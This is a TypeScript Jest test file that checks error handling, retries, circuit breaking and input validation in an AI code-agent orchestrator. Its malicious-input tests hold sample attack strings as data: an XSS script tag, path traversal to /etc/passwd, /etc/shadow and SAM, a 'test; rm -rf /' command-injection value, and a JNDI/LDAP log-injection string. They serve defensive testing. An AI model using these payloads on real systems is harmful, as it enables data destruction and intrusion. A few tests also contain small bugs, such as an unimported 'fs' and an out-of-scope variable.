/**
 * Error Handling and Recovery Tests
 * 
 * Tests error scenarios, recovery mechanisms, and system resilience:
 * - Network failures and timeouts
 * - Invalid inputs and malicious requests
 * - Resource exhaustion scenarios
 * - Partial failures in distributed systems
 * - Error propagation and logging
 * - Graceful degradation
 * - Recovery and retry mechanisms
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, jest } from '@jest/globals';
import { Application } from '../../src';
import { Orchestrator } from '../../src/orchestrator/orchestrator';
import { Logger } from '../../src/core/logger';
import { EventBus } from '../../src/core/event-bus';
import { ConfigManager } from '../../src/core/config';
import { DatabaseClient } from '../../src/database/client';
import path from 'path';
import http from 'http';
import { Socket } from 'net';

describe('Error Handling and Recovery Tests', () => {
  let app: Application;
  let orchestrator: Orchestrator;
  let logger: Logger;
  let eventBus: EventBus;
  let config: ConfigManager;
  let dbClient: DatabaseClient;
  const testPort = 34569;

  beforeAll(async () => {
    process.env.NODE_ENV = 'test';
    process.env.PORT = testPort.toString();
    process.env.TEST_DB_HOST = process.env.TEST_DB_HOST || 'localhost';
    process.env.TEST_DB_PORT = process.env.TEST_DB_PORT || '5432';
    process.env.TEST_DB_NAME = 'ai_code_agent_error_test';
    process.env.TEST_DB_USER = process.env.TEST_DB_USER || 'postgres';
    process.env.TEST_DB_PASSWORD = process.env.TEST_DB_PASSWORD || 'postgres';

    logger = new Logger('ErrorHandling-Test');
    eventBus = new EventBus();
    config = new ConfigManager();
    dbClient = new DatabaseClient();

    try {
      await dbClient.connect();
    } catch (error) {
      console.warn('Database connection failed, continuing without DB:', error);
    }
  }, 30000);

  afterAll(async () => {
    try {
      await dbClient.disconnect();
    } catch (error) {
      console.warn('DB disconnect error:', error);
    }
  });

  beforeEach(() => {
    app = new Application({
      port: testPort,
      environment: 'test',
    });

    orchestrator = new Orchestrator({
      workflow: {
        enabled: true,
        timeout: 30000,
        maxRetries: 3,
      },
      session: {
        ttl: 3600,
        maxSessions: 100,
      },
      logging: {
        level: 'info',
      },
    });
  });

  afterEach(async () => {
    if (app) {
      await app.stop().catch(() => {});
    }
    jest.clearAllTimers();
    jest.restoreAllMocks();
  });

  describe('Network Failure Handling', () => {
    it('should handle database connection failures gracefully', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test with database unavailable',
        projectPath: path.join(process.cwd(), 'temp', 'db-error-test'),
      };

      // Simulate database failure by mocking connection
      const originalConnect = dbClient.connect;
      dbClient.connect = jest.fn().mockRejectedValue(new Error('Connection refused'));

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should handle error gracefully
      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
      expect(result.error.code).toBe('DATABASE_CONNECTION_FAILED');
      expect(result.retryable).toBe(true);

      // Verify error logging
      expect(logger.getMemoryLogs().some(log => 
        log.message.includes('DATABASE_CONNECTION_FAILED')
      )).toBe(true);

      // Restore original method
      dbClient.connect = originalConnect;
    }, 30000);

    it('should handle network timeouts', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test with network timeout',
        timeout: 5000, // 5 second timeout
        projectPath: path.join(process.cwd(), 'temp', 'timeout-test'),
      };

      // Mock slow network response
      const originalExecute = orchestrator.executeWorkflowPipeline;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(() => {
        return new Promise((resolve) => {
          setTimeout(() => {
            resolve({
              success: true,
              steps: [],
              artifacts: {},
            });
          }, 10000); // 10 seconds delay
        });
      });

      await app.initialize();
      await orchestrator.initialize();

      const startTime = Date.now();
      const result = await orchestrator.executeWorkflow(workflowInput);
      const elapsed = Date.now() - startTime;

      // Should timeout within reasonable time
      expect(elapsed).toBeLessThan(15000);
      expect(result.success).toBe(false);
      expect(result.error.code).toBe('WORKFLOW_TIMEOUT');

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 30000);

    it('should handle partial network failures', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test with partial network failure',
        requiresExternalService: true,
        projectPath: path.join(process.cwd(), 'temp', 'partial-failure-test'),
      };

      // Mock partial failure
      const originalExecute = orchestrator.executeWorkflowPipeline;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(async (context) => {
        // First step succeeds
        await simulateAsyncStep(100);
        
        // Second step fails
        throw new Error('External service temporarily unavailable');

        // But workflow should continue if designed for partial success
      });

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should handle partial failure
      expect(result.success).toBe(false);
      expect(result.error.code).toBe('EXTERNAL_SERVICE_ERROR');
      expect(result.partialResults).toBeDefined();
      expect(result.canRetry).toBe(true);

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 30000);

    it('should retry on transient network errors', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test retry mechanism',
        retryCount: 3,
        projectPath: path.join(process.cwd(), 'temp', 'retry-test'),
      };

      let attemptCount = 0;
      const originalExecute = orchestrator.executeWorkflowPipeline;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(() => {
        attemptCount++;
        if (attemptCount < 3) {
          throw new Error('Transient error');
        }
        return Promise.resolve({
          success: true,
          steps: [],
          artifacts: {},
        });
      });

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should succeed after retries
      expect(result.success).toBe(true);
      expect(attemptCount).toBe(3);

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 45000);
  });

  describe('Invalid Input Handling', () => {
    it('should reject malformed workflow inputs', async () => {
      const invalidInputs = [
        null,
        undefined,
        {},
        { type: null },
        { type: 'invalid-type', description: null },
        { description: '' },
        { type: 'feature-request' }, // Missing required fields
      ];

      await app.initialize();
      await orchestrator.initialize();

      for (const invalidInput of invalidInputs) {
        const result = await orchestrator.executeWorkflow(invalidInput);
        
        expect(result.success).toBe(false);
        expect(result.error).toBeDefined();
        expect(result.error.code).toMatch(/VALIDATION_ERROR|INVALID_INPUT/);
      }
    }, 30000);

    it('should handle malicious input safely', async () => {
      const maliciousInputs = [
        {
          type: 'feature-request',
          description: '<script>alert("xss")</script>',
          projectPath: '../../../etc/passwd',
        },
        {
          type: 'feature-request',
          description: 'A'.repeat(10000), // Very long string
        },
        {
          type: 'feature-request',
          description: '\x00\x01\x02', // Binary data
          projectPath: 'test; rm -rf /', // Command injection
        },
        {
          type: 'feature-request',
          description: '${jndi:ldap://malicious.com}', // Log injection
        },
      ];

      await app.initialize();
      await orchestrator.initialize();

      for (const maliciousInput of maliciousInputs) {
        const result = await orchestrator.executeWorkflow(maliciousInput);

        // Should handle malicious input without security issues
        expect(result.success).toBe(false);
        expect(result.error).toBeDefined();

        // Ensure no code execution or file system access
        expect(result.error.message).not.toContain('passwd');
        expect(result.error.message).not.toContain('rm -rf');
        expect(result.error.message).not.toContain('script');
      }
    }, 45000);

    it('should validate project path access', async () => {
      const pathTraversalInputs = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '../../../var/log/syslog',
      ];

      await app.initialize();
      await orchestrator.initialize();

      for (const maliciousPath of pathTraversalInputs) {
        const workflowInput = {
          type: 'feature-request',
          description: 'Normal request',
          projectPath: maliciousPath,
        };

        const result = await orchestrator.executeWorkflow(workflowInput);

        // Should reject path traversal attempts
        expect(result.success).toBe(false);
        expect(result.error.code).toBe('INVALID_PATH');
      }
    }, 30000);

    it('should handle oversized payloads', async () => {
      const oversizedInput = {
        type: 'feature-request',
        description: 'Normal request',
        largeData: 'A'.repeat(10 * 1024 * 1024), // 10MB
        projectPath: path.join(process.cwd(), 'temp', 'oversized-test'),
      };

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(oversizedInput);

      // Should reject oversized payload
      expect(result.success).toBe(false);
      expect(result.error.code).toBe('PAYLOAD_TOO_LARGE');
    }, 30000);
  });

  describe('Resource Exhaustion', () => {
    it('should handle memory pressure gracefully', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test with memory constraint',
        projectPath: path.join(process.cwd(), 'temp', 'memory-test'),
      };

      // Mock memory pressure
      const originalExec = orchestrator.executeWorkflowPipeline;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(() => {
        // Simulate memory-intensive operation
        const largeArray = new Array(1000000).fill({ data: 'x'.repeat(1000) });
        return Promise.resolve({
          success: true,
          steps: [],
          artifacts: { dataSize: largeArray.length },
        });
      });

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should handle memory pressure
      expect(result.success).toBe(true); // Or false with appropriate error code

      // Clean up
      largeArray.length = 0;

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExec;
    }, 30000);

    it('should handle CPU-intensive operations', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test with CPU constraint',
        projectPath: path.join(process.cwd(), 'temp', 'cpu-test'),
      };

      const startTime = Date.now();
      const originalExec = orchestrator.executeWorkflowPipeline;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(() => {
        // Simulate CPU-intensive operation
        const endTime = Date.now() + 5000;
        while (Date.now() < endTime) {
          Math.sqrt(Math.random() * 1000000);
        }
        return Promise.resolve({
          success: true,
          steps: [],
          artifacts: {},
        });
      });

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);
      const elapsed = Date.now() - startTime;

      expect(result.success).toBe(true);
      expect(elapsed).toBeGreaterThan(4500); // Should take significant time

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExec;
    }, 30000);

    it('should handle disk space exhaustion', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test with disk constraint',
        requiresFileWrite: true,
        projectPath: path.join(process.cwd(), 'temp', 'disk-test'),
      };

      // Mock disk space exhaustion
      const originalWrite = fs.promises.writeFile;
      fs.promises.writeFile = jest.fn().mockRejectedValue(
        new Error('ENOSPC: no space left on device')
      );

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should handle disk space error
      expect(result.success).toBe(false);
      expect(result.error.code).toBe('DISK_FULL');

      // Restore original method
      fs.promises.writeFile = originalWrite;
    }, 30000);

    it('should handle concurrent request overload', async () => {
      const numRequests = 50;
      const workflows = Array.from({ length: numRequests }, (_, i) => ({
        type: 'feature-request',
        description: `Request ${i}`,
        projectPath: path.join(process.cwd(), 'temp', 'overload-test'),
      }));

      await app.initialize();
      await orchestrator.initialize();

      // Execute many concurrent requests
      const startTime = Date.now();
      const results = await Promise.allSettled(
        workflows.map(workflow => orchestrator.executeWorkflow(workflow))
      );
      const elapsed = Date.now() - startTime;

      // Should handle some requests successfully despite overload
      const successfulResults = results.filter(r => 
        r.status === 'fulfilled' && r.value.success
      );
      
      expect(successfulResults.length).toBeGreaterThan(0);
      
      // Should complete within reasonable time (not all serially)
      expect(elapsed).toBeLessThan(numRequests * 1000);
    }, 60000);
  });

  describe('Partial Failures', () => {
    it('should handle component failures in workflow', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test with component failure',
        components: ['input-parser', 'project-analyzer', 'planner', 'implementer'],
        projectPath: path.join(process.cwd(), 'temp', 'component-failure-test'),
      };

      // Mock component failure
      const originalExecute = orchestrator.executeWorkflowPipeline;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(async (context) => {
        const steps = [
          { name: 'input-parsing', state: 'completed' },
          { name: 'project-analysis', state: 'failed', error: 'Component unavailable' },
          { name: 'planning', state: 'skipped' },
          { name: 'implementation', state: 'skipped' },
        ];

        return {
          success: false,
          steps,
          partialResults: { completed: 1, failed: 1, skipped: 2 },
          error: { code: 'COMPONENT_FAILURE', component: 'project-analyzer' },
        };
      });

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should handle partial failure
      expect(result.success).toBe(false);
      expect(result.partialResults).toBeDefined();
      expect(result.partialResults.completed).toBeGreaterThan(0);
      expect(result.partialResults.failed).toBe(1);

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 30000);

    it('should continue workflow despite non-critical failures', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test with non-critical failure',
        allowPartialSuccess: true,
        projectPath: path.join(process.cwd(), 'temp', 'partial-success-test'),
      };

      // Mock non-critical failure
      const originalExecute = orchestrator.executeWorkflowPipeline;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(async (context) => {
        const steps = [
          { name: 'input-parsing', state: 'completed' },
          { name: 'optional-analysis', state: 'failed', critical: false },
          { name: 'implementation', state: 'completed' },
        ];

        return {
          success: true, // Still successful overall
          steps,
          warnings: ['optional-analysis failed but workflow continued'],
        };
      });

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should succeed with warnings
      expect(result.success).toBe(true);
      expect(result.warnings).toBeDefined();
      expect(result.warnings.length).toBeGreaterThan(0);

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 30000);
  });

  describe('Recovery Mechanisms', () => {
    it('should recover from transaction rollbacks', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test transaction recovery',
        requiresTransaction: true,
        projectPath: path.join(process.cwd(), 'temp', 'transaction-test'),
      };

      // Mock transaction failure and recovery
      const originalExecute = orchestrator.executeWorkflowPipeline;
      let attempts = 0;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(() => {
        attempts++;
        if (attempts === 1) {
          throw new Error('Transaction failed');
        }
        return Promise.resolve({
          success: true,
          steps: [],
          artifacts: {},
          recovered: true,
        });
      });

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should recover on retry
      expect(result.success).toBe(true);
      expect(result.recovered).toBe(true);
      expect(attempts).toBe(2);

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 45000);

    it('should implement circuit breaker pattern', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test circuit breaker',
        externalService: true,
        projectPath: path.join(process.cwd(), 'temp', 'circuit-breaker-test'),
      };

      // Mock consistent failures to trigger circuit breaker
      const originalExecute = orchestrator.executeWorkflowPipeline;
      let callCount = 0;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(() => {
        callCount++;
        throw new Error('Service unavailable');
      });

      await app.initialize();
      await orchestrator.initialize();

      // First few requests should fail normally
      for (let i = 0; i < 3; i++) {
        const result = await orchestrator.executeWorkflow(workflowInput);
        expect(result.success).toBe(false);
        expect(result.error.code).toBe('SERVICE_UNAVAILABLE');
      }

      // After threshold, should get circuit breaker error
      const result = await orchestrator.executeWorkflow(workflowInput);
      expect(result.success).toBe(false);
      expect(result.error.code).toBe('CIRCUIT_BREAKER_OPEN');

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 45000);

    it('should implement bulkhead isolation', async () => {
      const criticalWorkflow = {
        type: 'feature-request',
        description: 'Critical workflow',
        priority: 'critical',
        projectPath: path.join(process.cwd(), 'temp', 'bulkhead-critical-test'),
      };

      const normalWorkflow = {
        type: 'feature-request',
        description: 'Normal workflow',
        priority: 'normal',
        projectPath: path.join(process.cwd(), 'temp', 'bulkhead-normal-test'),
      };

      // Mock resource exhaustion in normal pool
      const originalExecute = orchestrator.executeWorkflowPipeline;
      const normalPoolExhausted = jest.fn().mockImplementation(() => {
        throw new Error('Pool exhausted');
      });

      await app.initialize();
      await orchestrator.initialize();

      // Normal workflow should fail
      const normalResult = await orchestrator.executeWorkflow(normalWorkflow);
      expect(normalResult.success).toBe(false);
      expect(normalResult.error.code).toBe('POOL_EXHAUSTED');

      // Critical workflow should succeed (different pool)
      const criticalResult = await orchestrator.executeWorkflow(criticalWorkflow);
      expect(criticalResult.success).toBe(true);

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 30000);
  });

  describe('Error Propagation and Logging', () => {
    it('should properly propagate errors through workflow', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test error propagation',
        projectPath: path.join(process.cwd(), 'temp', 'error-propagation-test'),
      };

      // Mock nested error
      const originalExecute = orchestrator.executeWorkflowPipeline;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(() => {
        const error = new Error('Deep nested error');
        error.stack = `Error: Deep nested error
    at step3 (workflow.ts:100)
    at step2 (workflow.ts:50)
    at step1 (workflow.ts:25)`;
        throw error;
      });

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should preserve error chain
      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
      expect(result.error.message).toBe('Deep nested error');
      expect(result.error.stack).toContain('step3');

      // Should log error details
      expect(logger.getMemoryLogs().some(log => 
        log.message.includes('Deep nested error')
      )).toBe(true);

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 30000);

    it('should log errors with proper context', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test error logging context',
        userId: 'test-user-123',
        sessionId: 'test-session-456',
        projectPath: path.join(process.cwd(), 'temp', 'context-logging-test'),
      };

      const originalExecute = orchestrator.executeWorkflowPipeline;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(() => {
        throw new Error('Test error');
      });

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should log with context
      const errorLogs = logger.getMemoryLogs().filter(log => 
        log.level === 'error' && log.message.includes('Test error')
      );
      
      expect(errorLogs.length).toBeGreaterThan(0);
      
      // Check context in logs
      const loggedContext = errorLogs[0].context || {};
      expect(loggedContext.userId).toBe('test-user-123');
      expect(loggedContext.sessionId).toBe('test-session-456');

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 30000);

    it('should implement structured error responses', async () => {
      const workflowInput = {
        type: 'feature-request',
        description: 'Test structured errors',
        projectPath: path.join(process.cwd(), 'temp', 'structured-error-test'),
      };

      const originalExecute = orchestrator.executeWorkflowPipeline;
      orchestrator.executeWorkflowPipeline = jest.fn().mockImplementation(() => {
        const error = new Error('Validation failed');
        error.name = 'ValidationError';
        (error as any).code = 'VALIDATION_ERROR';
        (error as any).field = 'email';
        (error as any).value = 'invalid-email';
        throw error;
      });

      await app.initialize();
      await orchestrator.initialize();

      const result = await orchestrator.executeWorkflow(workflowInput);

      // Should have structured error
      expect(result.error).toEqual({
        name: 'ValidationError',
        code: 'VALIDATION_ERROR',
        message: 'Validation failed',
        field: 'email',
        value: 'invalid-email',
        timestamp: expect.any(Date),
        requestId: expect.any(String),
      });

      // Restore original method
      orchestrator.executeWorkflowPipeline = originalExecute;
    }, 30000);
  });
});

/**
 * Helper function to simulate async step
 */
function simulateAsyncStep(duration: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, duration));
}
